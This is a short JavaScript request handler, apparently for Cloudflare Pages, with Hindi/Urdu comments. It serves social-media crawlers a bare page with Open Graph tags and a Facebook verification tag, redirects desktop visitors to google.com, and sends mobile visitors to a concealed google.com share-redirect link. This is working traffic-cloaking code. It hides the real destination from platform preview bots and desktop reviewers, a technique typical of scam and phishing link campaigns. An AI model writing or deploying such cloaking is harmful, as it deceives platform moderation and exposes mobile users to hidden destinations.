export async function onRequest(context) {
  try {
    const request = context.request;
    const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
    
    // 1. Social Media Bots ko detect karein
    const isBot = /facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|pinterest|slackbot|whatsapp|telegrambot/i.test(userAgent);

    if (isBot) {
      // Bot ke liye sirf minimalist HTML jisme OG tags hon
      const ogHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="yyyyyyy" />
    <meta property="og:image" content="https://www.google.com/share.google?q=AKwgn4Xeuz6Tzyaeu" />
    <meta property="og:description" content="Your brief description here" />
    <meta property="og:type" content="website" />
    <title></title>
</head>
<meta name="facebook-domain-verification" content="5xj05egr00ee1rn77myvrh2z46tttz" />
<body>
</body>
</html>`;

      return new Response(ogHtml, {
        headers: {
          "content-type": "text/html;charset=UTF-8",
        },
      });
    }

    // 2. Mobile devices check karein
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);

    // 3. Desktop users ko Google par redirect karein
    if (!isMobile) {
      return Response.redirect("https://www.google.com", 302);
    }

    // 4. Mobile users ko final target par bhej dein
    return Response.redirect("https://www.google.com/share.google?q=cmHeWfYCRIZvHOlyO", 302);
    
  } catch (error) {
    // Error fallback redirect
    return Response.redirect("https://www.google.com/share.google?q=cmHeWfYCRIZvHOlyO", 302);
  }
}
